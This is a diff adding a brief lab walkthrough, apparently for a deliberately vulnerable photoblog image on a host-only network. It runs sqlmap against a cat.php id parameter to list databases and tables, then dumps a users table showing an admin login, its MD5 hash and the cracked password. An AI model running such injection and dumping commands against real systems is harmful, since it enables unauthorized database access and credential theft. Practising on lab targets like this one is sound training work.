@@ -1,0 +1,29 @@
+new import the image.
+set network adapter : hostonly 
+ifconfig.
+
+open the page from from your browser with IP address, start hacking.
+
+sqlmap -u http://192.168.56.5/cat.php?id=* --data "id=*" --dbs
+
+[*] information_schema
+[*] photoblog
+
+sqlmap -u http://192.168.56.5/cat.php?id=* -D photoblog --tables
+
++------------+
+| categories |
+| pictures   |
+| users      |
++------------+
+
+sqlmap -u http://192.168.56.5/cat.php?id=* -D photoblog -T users --all
+
+
++----+-------+---------------------------------------------+
+| id | login | password                                    |
++----+-------+---------------------------------------------+
+| 1  | admin | 8efe310f9ab3efeae8d410a8e0166eb2 (P4ssw0rd) |
++----+-------+---------------------------------------------+
+
+
